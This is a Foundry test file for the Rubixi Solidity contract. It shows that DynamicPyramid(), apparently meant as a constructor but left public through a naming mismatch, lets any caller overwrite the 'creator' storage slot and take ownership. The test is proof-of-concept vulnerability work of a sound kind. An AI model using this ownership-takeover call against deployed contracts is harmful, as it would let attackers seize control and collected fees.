
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Identify the storage slot for 'creator'.
        // Layout:
        // slot 0: balance (uint)
        // slot 1: collectedFees (uint)
        // slot 2: feePercent (uint)
        // slot 3: pyramidMultiplier (uint)
        // slot 4: payoutOrder (uint)
        // slot 5: creator (address)
        bytes32 creatorSlot = bytes32(uint256(5));
        
        // Load current owner to exclude them from the test (though initially it is 0x0)
        address currentOwner = address(uint160(uint256(vm.load(address(_contractUnderTest), creatorSlot))));
        vm.assume(caller != currentOwner);

        // --- 2. State Configuration ---
        // No funding required as DynamicPyramid is not payable and requires no value.

        // --- 3. Execution & Assertion ---
        
        vm.prank(caller);

        // The function DynamicPyramid is intended to be a constructor but is a public function due to a naming mismatch.
        // Calling it overwrites the 'creator' variable.
        _contractUnderTest.DynamicPyramid();

        // Verify the exploit: The caller should now be the creator.
        address newOwner = address(uint160(uint256(vm.load(address(_contractUnderTest), creatorSlot))));
        assertEq(newOwner, caller, "Arbitrary user successfully took ownership via DynamicPyramid()");
    }
}
